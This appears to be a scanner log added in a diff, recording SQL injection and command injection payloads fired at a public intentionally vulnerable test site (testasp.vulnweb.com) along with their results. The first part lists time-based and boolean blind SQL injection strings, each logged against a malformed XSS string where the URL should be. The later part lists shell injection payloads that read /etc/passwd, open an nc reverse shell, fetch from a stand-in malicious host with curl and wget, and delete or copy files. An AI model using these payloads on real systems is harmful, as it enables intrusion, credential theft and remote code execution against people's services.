+URL:     <script>alert('XSS')</script>, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: +benchmark(3200,SHA1(1))+', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: + SLEEP(10) + ', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: RANDOMBLOB(500000000/2), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: RANDOMBLOB(1000000000/2), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: '|| pg_sleep(10) --+, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ORDER BY 30, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ORDER BY 31337, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: %' AND 8310=8310 AND '%'=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: %' AND 8310=8311 AND '%'=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,1,1))='X', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,1,1))='M', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,2,1))='i', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,2,1))='y', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,3,1))='c', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,3,1))='S', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,3,1))='X', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1 or sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: " or sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ' or sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: " or sleep(5)=", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ' or sleep(5)=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1) or sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ") or sleep(5)=", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ') or sleep(5)=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1 or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: " or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ' or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ") or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ') or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1)) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ")) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ')) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1 or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: " or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ' or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1) or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ") or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ') or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1)) or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ")) or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ')) or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: SLEEP(5)=", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: SLEEP(5)=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or SLEEP(5)=", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or SLEEP(5)=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: waitfor delay '00:00:05', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: waitfor delay '00:00:05'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: waitfor delay '00:00:05'#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: pg_SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: pg_SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: pg_SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or pg_SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or pg_SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or pg_SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: '\", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AnD SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AnD SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AnD SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: &&SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: &&SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: &&SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ' AnD SLEEP(5) ANd '1, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: '&&SLEEP(5)&&'1, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ORDER BY SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ORDER BY SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ORDER BY SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: +benchmark(3200,SHA1(1))+', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: + SLEEP(10) + ', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: RANDOMBLOB(500000000/2), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: RANDOMBLOB(1000000000/2), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: '|| pg_sleep(10) --+, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
+URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
